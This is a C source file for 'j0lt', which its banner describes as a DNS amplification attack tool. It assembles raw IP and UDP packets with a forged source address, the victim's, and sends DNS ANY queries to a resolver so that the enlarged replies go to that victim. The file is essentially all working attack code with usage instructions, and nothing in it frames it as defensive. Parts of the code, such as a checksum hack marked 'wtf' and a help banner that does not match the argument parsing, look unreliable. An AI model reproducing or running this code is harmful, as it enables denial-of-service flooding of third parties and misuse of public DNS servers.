/* j0lt.c 
 * 
 * For using:
 * ./j0lt <RESOLVER IP> <SPOOF_IP> <RESOLVER PORT> <SPOOF PORT> <PAGE>
 *
 * For reading:
 * https://datatracker.ietf.org/doc/html/rfc1700 (NUMBERS)
 * https://datatracker.ietf.org/doc/html/rfc1035 (DNS)
 * https://datatracker.ietf.org/doc/html/rfc1071 (CHECKSUM)
 * https://www.rfc-editor.org/rfc/rfc7648.html (UDP)
 * https://www.rfc-editor.org/rfc/rfc760 (IP)
 *
 * For testing:
 * use ctrl + ` to bring up a terminal then $ unshare -rn. This will give you suid to test this
 * sudo tcpdump -X -n udp port 53
 * 
 * the-scientist
 */

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h> 

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <arpa/nameser.h> 
#include <arpa/nameser_compat.h>

#include <netinet/ip.h>
#include <netinet/udp.h>

#include <netdb.h>
#include <unistd.h>

const char* g_ansi = {
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒                   ▒░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░  ░░                 ░░░░░░░░░░░░░░░░░░░░░░ ░░░░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓ ░\n"
    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓▓░░░░ ░░░░░▒▒░   ▓▓▓▓▓▓▓▓   \n"
    "░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░          ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ░\n"
    "░░░░░▓▓▓▓▓▓▓▓▓▓ ░░░░░░  ▓▓▓            ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ░\n"
    "░░░░▒▓▓▓▓▓▓▓▓▓▓ ░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ░░\n"
    "░░░░▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓ ▓▓▓     ▓▓▓▓▓▓▓▓         ▓░░\n"
    "░░░░   ▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓         ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
    "░░░░░░░▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓       ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓░ ░░░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
    "░░░░░░░ ▓▓▓ ▓▓▓▓▓▓▓▓           ▓▓▓▓ ▓▓▓▓▓▓▓▓▓  ░░░░░░░░▓▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓▓             ▓▓▓ ▓▓▓▓▓▓▓▓  ░░░░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓              ▓▓ ▓▓▓▓▓▓▓▓▓▓▓  ▓░░░░░░ ▓▓▓▓▓▓▓▓ ▓░░░░░░░░░\n"
    "░░░░░░░░▓▓ ▓▓▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓░▓▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
    "▓▓▓░░ ▓▓▓▓▓ ▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▒░░▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓ ▓▓                     ▓▓▓    ▓▓▓▓▓▓▓   ░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓▓                     ▓▓▓▓▓  ░░        ░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░\n"
    "▓▓▓▓▓▓▓▓▓▓▓                     ▓▓▓▓   ░░░░░░░░░░░░░░░░░▒   ░     ░░░░░░░░░\n"
    "              ░  ▓            ▓▓▓▓    ░░░░░░░░░░░░░░░░░░░▓     ░▒▓░░░░░░░░░\n"
    "░░▓      ░░░░░░░░           ▓▓ ░    ░░░░░    ░░░░░    ░░░░░░░░░░░░░░░░░░░░░\n"
    "░░░░░░░░░░░░░░░░                ░░░░░░░                   ░░░░░            \n"
    "░░░░░░░░░░░░░░░         ▓░░░░░░░░░░░░  Usage: sudo ./j0lt [OPTION]...      \n"
    "░░░░░░░░░░░░░░        ░ ░░░░░░░░░░░                                        \n"
    "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target server(spoof)   \n"
    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>       : target port            \n"
    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -n <num>        : num UDP packets to send\n"
    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░ -r <dns rcrd>   : list of dns records    \n"
    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░ -s <dns srv>    : list of dns servers    \n"
    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░ -P <dns port>   : dns port (53)          \n"
    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░░  w3lc0m3 t0 j0lt                         \n"
    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░░  a DNS amplification attack tool         \n"
    "░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
    "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        the-scientist     \n"
    "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        tofu@rootstorm.com\n"
};

typedef struct __attribute__((packed, aligned(1))) {
    uint32_t sourceaddr;
    uint32_t destaddr;

#if __BYTE_ORDER == __BIGENDIAN 
    uint32_t zero : 8;
    uint32_t protocol : 8;
    uint32_t udplen : 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint32_t udplen : 16;
    uint32_t protocol : 8;
    uint32_t zero : 8;
#endif
} PSEUDOHDR;

#define DEFINE_INSERT_FN(typename, datatype)           \
        bool insert_##typename                         \
        (uint8_t** buf, size_t* buflen, datatype data) \
    {                                                  \
        uint64_t msb_mask, lsb_mask,                   \
            bigendian_data, lsb, msb;                  \
        size_t byte_pos, nbits;                        \
                                                       \
        if (*buflen < 1) {                             \
            return false;                              \
        }                                              \
                                                       \
        nbits = sizeof(data) << 3;                     \
        bigendian_data = 0ULL;                         \
        byte_pos = (nbits / 8) - 1;                    \
        lsb_mask = 0xffULL;                            \
        msb_mask = lsb_mask << nbits - 8;              \
                                                       \
        byte_pos = byte_pos << 3;                      \
        for (int i = nbits >> 4; i != 0; i--) {        \
            lsb = (data & lsb_mask);                   \
            msb = (data & msb_mask);                   \
            lsb <<= byte_pos;                          \
            msb >>= byte_pos;                          \
            bigendian_data |= lsb | msb;               \
            msb_mask >>= 8;                            \
            lsb_mask <<= 8;                            \
            byte_pos -= (2 << 3);                      \
        }                                              \
                                                       \
        data = bigendian_data == 0 ?                   \
            data : bigendian_data;                     \
        for (int i = sizeof(data);                     \
             *buflen != -1 && i > 0; i--) {            \
            *(*buf)++ = (data & 0xff);                 \
            data >>= 8;                                \
            (*buflen)--;                               \
        }                                              \
                                                       \
        return data == 0;                              \
    }                                                  \

DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

// IP HEADER VALUES
#define     IP_IHL_MIN_J0LT 5
#define     IP_IHL_MAX_J0LT 15
#define     IP_TTL_J0LT 0x40
#define     IP_ID_J0LT 0xc3f0
// FLAGS
#define     IP_RF_J0LT 0x8000 // reserved fragment flag
#define     IP_DF_J0LT 0x4000 // dont fragment flag
#define     IP_MF_J0LT 0x2000 // more fragments flag
// END FLAGS
#define     IP_VER_J0LT 4
// END IPHEADER VALUES 

// DNS HEADER VALUES 
#define 	DNS_ID_J0LT 0x1337
#define 	DNS_QR_J0LT 0 // query (0), response (1).
// OPCODE VALS 
#define 	DNS_OP_QUERY_J0LT  0 // standard query (QUERY)
#define 	DNS_OP_IQUERY_J0LT 1 // inverse query (IQUERY)
#define 	DNS_OP_STATUS_J0LT 2 // server status (STATUS)
#define 	DNS_OPCODE_J0LT DNS_OP_QUERY_J0LT
// END OPCODE
#define 	DNS_AA_J0LT 0 // Authoritative Answer
#define 	DNS_TC_J0LT 0 // TrunCation
#define 	DNS_RD_J0LT 0 // Recursion Desired 
#define 	DNS_RA_J0LT 0 // Recursion Available
#define 	DNS_Z_J0LT 0 // Reserved
#define 	DNS_AD_J0LT 0 // dns sec
#define 	DNS_CD_J0LT 0 // dns sec
// RCODE
#define 	DNS_RC_NO_ER_J0LT   0
#define 	DNS_RC_FMT_ERR_J0LT 1
#define 	DNS_RC_SRVR_FA_J0LT 2
#define 	DNS_RC_NAME_ER_J0LT 3
#define 	DNS_RC_NOT_IMP_J0LT 4
#define 	DNS_RC_REFUSED_J0LT 5
#define 	DNS_RCODE_J0LT DNS_RC_NO_ER_J0LT
// END RCODE
#define 	DNS_QDCOUNT_J0LT 0x0001 // num entry question
#define 	DNS_ANCOUNT_J0LT 0x0000 // num RR answer
#define 	DNS_NSCOUNT_J0LT 0x0000 // num NS RR 
#define     DNS_ARCOUNT_J0LT 0x0000 // num RR additional
// END HEADER VALUES

typedef struct iphdr IPHEADER;
typedef struct udphdr UDPHEADER;
typedef HEADER DNSHEADER;

bool
InsertUDPHeader(
        uint8_t** buf,
        size_t* buflen,
        UDPHEADER* header,
        PSEUDOHDR* pseudoheader,
        const uint8_t* data
);

bool
InsertIPHeader(
        uint8_t** buf,
        size_t* buflen,
        IPHEADER* header
);

bool
InsertDNSHeader(
        uint8_t** buf,
        size_t* buflen,
        const DNSHEADER* header
);

bool
InsertDNSQuestion(
        void** buf,
        size_t* buflen,
        const char* domain,
        uint16_t query_type,
        uint16_t query_class
);

void
PackDNSHeader(
        DNSHEADER* dnshdr
);

void
PackUDPHeader(
        UDPHEADER* udphdr,
        PSEUDOHDR* pseudohdr,
        const char* resolverport,
        const char* spoofport,
        size_t nwritten
);

void
PackIPHeader(
        IPHEADER* iphdr,
        PSEUDOHDR* pseudohdr,
        const char* resolvip,
        const char* spoofip,
        size_t nwritten,
        size_t udpsz
);

bool
InsertData(
        void** dst,
        size_t* dst_buflen,
        const void* src,
        size_t src_len
);

uint16_t
CheckSum(
        const uint16_t* addr,
        size_t count
);

bool
SendPayload(
        const uint8_t* datagram,
        uint32_t daddr,
        uint16_t uh_dport,
        size_t nwritten
);

void
PrintHex(
        const uint8_t* datagram,
        size_t nwritten
);

#define DEBUG 0
int
main(int argc, char** argv)
{
    const char* resolvip, * spoofip, * resolvport, * spoofport, * url;
    uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ];
    uint8_t* curpos;
    size_t buflen, nwritten, szdatagram;
    bool status;

    UDPHEADER udpheader;
    DNSHEADER dnsheader;
    IPHEADER ipheader;
    PSEUDOHDR pseudoheader;

    printf("%s", g_ansi);

    if (argc != 6)
        goto fail_state;

    resolvip = argv[ 1 ];
    spoofip = argv[ 2 ];
    resolvport = argv[ 3 ];
    spoofport = argv[ 4 ];
    url = argv[ 5 ];

    buflen = NS_PACKETSZ;
    memset(pktbuf, 0, NS_PACKETSZ);

    curpos = pktbuf;
    status = true;
    PackDNSHeader(&dnsheader);
    status &= InsertDNSHeader(&curpos, &buflen, &dnsheader);
    status &= InsertDNSQuestion(( void** ) &curpos, &buflen, url, ns_t_any, ns_c_any);
    if (status == false)
        goto fail_state;

    nwritten = NS_PACKETSZ - buflen;
    PackIPHeader(&ipheader, &pseudoheader, resolvip, spoofip, nwritten, sizeof(UDPHEADER));
    PackUDPHeader(&udpheader, &pseudoheader, resolvport, spoofport, nwritten);

    memset(datagram, 0, NS_PACKETSZ);
    curpos = datagram;
    status &= InsertIPHeader(&curpos, &buflen, &ipheader);
    status &= InsertUDPHeader(&curpos, &buflen, &udpheader, &pseudoheader, pktbuf);
    if (status == false)
        goto fail_state;

    szdatagram = buflen;
    InsertData(( void** ) &curpos, &szdatagram, pktbuf, nwritten);
    nwritten = NS_PACKETSZ - buflen;

#if !DEBUG
    if (SendPayload(
        datagram,
        ipheader.daddr,
        udpheader.uh_dport,
        nwritten
    ) == false)
        goto fail_state;
#else 
    PrintHex(datagram, nwritten);
#endif
    return 0;
fail_state:
    perror("error");
    exit(EXIT_FAILURE);
} // END MAIN



void
PrintHex(const uint8_t* datagram,
        size_t nwritten) {

    size_t i, j;
    for (j = 0, i = 0; i < nwritten; i++) {
        if (i % 16 == 0) {
            printf("\n0x%.4x: ", j);
            j += 16;
        }
        if (i % 2 == 0)
            printf(" ");
        printf("%.2x", datagram[ i ]);
    }
}


bool
SendPayload(const uint8_t* datagram,
        uint32_t daddr,
        uint16_t uh_dport,
        size_t nwritten) {

    int raw_sockfd;
    ssize_t nread;
    struct sockaddr_in addr;

    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sockfd == -1)
        return false;

    addr.sin_family = AF_INET;
    addr.sin_port = uh_dport;
    addr.sin_addr.s_addr = daddr;

    nread = sendto(
            raw_sockfd,
            datagram,
            nwritten,
            0,
            ( const struct sockaddr* ) &addr,
            sizeof(addr)
    );

    close(raw_sockfd);

    return !(nread == -1 || nread != nwritten);
}


void
PackIPHeader(IPHEADER* iphdr,
        PSEUDOHDR* pseudohdr,
        const char* resolvip,
        const char* spoofip,
        size_t nwritten,
        size_t udpsz) {

    memset(iphdr, 0, sizeof(IPHEADER));
    iphdr->version = IP_VER_J0LT;
    iphdr->ihl = IP_IHL_MIN_J0LT;
    iphdr->tot_len = (iphdr->ihl << 2) + udpsz + nwritten;
    iphdr->id = IP_ID_J0LT;
    iphdr->frag_off = IP_DF_J0LT;
    iphdr->ttl = IP_TTL_J0LT;
    iphdr->protocol = getprotobyname("udp")->p_proto;
    iphdr->saddr = htonl(inet_addr(spoofip)); // spoofed ip address to victim
    iphdr->daddr = htonl(inet_addr(resolvip));   // name server 

    memset(pseudohdr, 0, sizeof(PSEUDOHDR));
    pseudohdr->protocol = iphdr->protocol;
    pseudohdr->destaddr = iphdr->daddr;
    pseudohdr->sourceaddr = iphdr->saddr;
}


void
PackUDPHeader(UDPHEADER* udphdr,
        PSEUDOHDR* pseudohdr,
        const char* resolverport,
        const char* spoofport,
        size_t nwritten) {

    uint16_t dport_uint16;
    uint16_t sport_uint16;

    errno = 0;
    dport_uint16 = ( uint16_t ) strtol(resolverport, NULL, 0);
    sport_uint16 = ( uint16_t ) strtol(spoofport, NULL, 0);
    if (errno != 0) {
        perror("port error: strtol");
        exit(EXIT_FAILURE);
    }

    memset(udphdr, 0, sizeof(UDPHEADER));
    udphdr->uh_dport = dport_uint16; // nameserver port
    udphdr->uh_sport = sport_uint16; // victim port
    udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);

    pseudohdr->udplen = sizeof(UDPHEADER);
}


void
PackDNSHeader(DNSHEADER* dnshdr) {

    memset(dnshdr, 0, sizeof(DNSHEADER));
    dnshdr->id = DNS_ID_J0LT;
    dnshdr->rd = DNS_RD_J0LT;
    dnshdr->tc = DNS_TC_J0LT;
    dnshdr->aa = DNS_AA_J0LT;
    dnshdr->opcode = DNS_OPCODE_J0LT;
    dnshdr->qr = DNS_QR_J0LT;
    dnshdr->rcode = DNS_RCODE_J0LT;
    dnshdr->cd = DNS_CD_J0LT;
    dnshdr->ad = DNS_AD_J0LT;
    dnshdr->unused = DNS_Z_J0LT;
    dnshdr->ra = DNS_RA_J0LT;
    dnshdr->qdcount = DNS_QDCOUNT_J0LT;
    dnshdr->ancount = DNS_ANCOUNT_J0LT;
    dnshdr->nscount = DNS_NSCOUNT_J0LT;
    dnshdr->arcount = DNS_ARCOUNT_J0LT;
}


bool
InsertIPHeader(uint8_t** buf,
        size_t* buflen,
        IPHEADER* header) {

    bool status;
    uint8_t* bufptr = *buf;
    uint8_t first_byte;

    status = true;
    first_byte = header->version << 4 | header->ihl;
    status &= insert_byte(buf, buflen, first_byte);
    status &= insert_byte(buf, buflen, header->tos);
    status &= insert_word(buf, buflen, header->tot_len);
    status &= insert_word(buf, buflen, header->id);
    status &= insert_word(buf, buflen, header->frag_off);
    status &= insert_byte(buf, buflen, header->ttl);
    status &= insert_byte(buf, buflen, header->protocol);
    status &= insert_word(buf, buflen, header->check);
    status &= insert_dword(buf, buflen, header->saddr);
    status &= insert_dword(buf, buflen, header->daddr);

    header->check = CheckSum(( const uint16_t* ) bufptr, ( size_t ) header->ihl << 2);
    *buf -= 0xa;
    *(*buf)++ = (header->check & 0xff00) >> 8;
    **buf = header->check & 0xff;
    *buf += 9;

    return status;
}


bool
InsertUDPHeader(uint8_t** buf,
        size_t* buflen,
        UDPHEADER* header,
        PSEUDOHDR* pseudoheader,
        const uint8_t* data) {

    bool status;
    size_t totalsz =
        sizeof(PSEUDOHDR) + header->uh_ulen;
    size_t datasz =
        abs(header->uh_ulen - sizeof(UDPHEADER));
    size_t udpsofar;
    uint8_t pseudo[ totalsz ];
    uint8_t* pseudoptr = pseudo;

    status = true;
    status &= insert_word(buf, buflen, header->uh_sport);
    status &= insert_word(buf, buflen, header->uh_dport);
    status &= insert_word(buf, buflen, header->uh_ulen);
    udpsofar = sizeof(UDPHEADER) - 2;

    memset(pseudo, 0, totalsz);
    insert_dword(&pseudoptr, &totalsz, pseudoheader->sourceaddr);
    insert_dword(&pseudoptr, &totalsz, pseudoheader->destaddr);
    insert_byte(&pseudoptr, &totalsz, pseudoheader->zero);
    insert_byte(&pseudoptr, &totalsz, pseudoheader->protocol);
    insert_word(&pseudoptr, &totalsz, pseudoheader->udplen);

    *buf -= udpsofar;
    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, *buf, udpsofar + 2);
    *buf += udpsofar;
    InsertData(( void** ) &pseudoptr, ( void* ) &totalsz, data, datasz);
    header->uh_sum =
        CheckSum(( uint16_t* ) pseudo,
        sizeof(PSEUDOHDR) + header->uh_ulen
        );

    header->uh_sum -= datasz; // wtf... 
    status &= insert_word(buf, buflen, header->uh_sum);

    return status;
}


bool
InsertDNSHeader(uint8_t** buf,
        size_t* buflen,
        const HEADER* header) {

    bool status;
    uint8_t third_byte, fourth_byte;

    third_byte = (
        header->rd |
        header->tc << 1 |
        header->aa << 2 |
        header->opcode << 3 |
        header->qr << 7
    );

    fourth_byte = (
        header->rcode |
        header->cd << 4 |
        header->ad << 5 |
        header->unused << 6 |
        header->ra << 7
    );

    status = true;
    status &= insert_word(buf, buflen, header->id);

    status &= insert_byte(buf, buflen, third_byte);
    status &= insert_byte(buf, buflen, fourth_byte);

    status &= insert_word(buf, buflen, header->qdcount);
    status &= insert_word(buf, buflen, header->ancount);
    status &= insert_word(buf, buflen, header->nscount);
    status &= insert_word(buf, buflen, header->arcount);

    return status;
}


bool
InsertDNSQuestion(void** buf,
        size_t* buflen,
        const char* domain,
        uint16_t query_type,
        uint16_t query_class) {

    const char* token;
    char* saveptr, qname[ NS_PACKETSZ ];
    size_t srclen, domainlen;
    bool status;

    domainlen = strlen(domain) + 1;
    if (domainlen > NS_PACKETSZ - 1)
        return false;

    memcpy(qname, domain, domainlen);

    token = strtok_r(qname, ".", &saveptr);
    if (token == NULL)
        return false;

    while (token != NULL) {
        srclen = strlen(token);
        insert_byte(( uint8_t** ) buf, buflen, srclen);
        InsertData(buf, buflen, token, srclen);
        token = strtok_r(NULL, ".", &saveptr);
    }

    status = true;
    status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
    status &= insert_word(( uint8_t** ) buf, buflen, query_type);
    status &= insert_word(( uint8_t** ) buf, buflen, query_class);

    return status;
}


bool
InsertData(void** dst,
        size_t* dst_buflen,
        const void* src,
        size_t src_len) {

    if (*dst_buflen < src_len)
        return false;

    memcpy(*dst, src, src_len);
    *dst += src_len;
    *dst_buflen -= src_len;

    return true;
}


uint16_t
CheckSum(const uint16_t* addr,
        size_t count) {

    register uint64_t sum = 0;

    while (count > 1) {
        sum += *( uint16_t* ) addr++;
        count -= 2;
    }

    if (count > 0)
        sum += *( uint8_t* ) addr;

    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return ~(( uint16_t ) ((sum << 8) | (sum >> 8)));
}
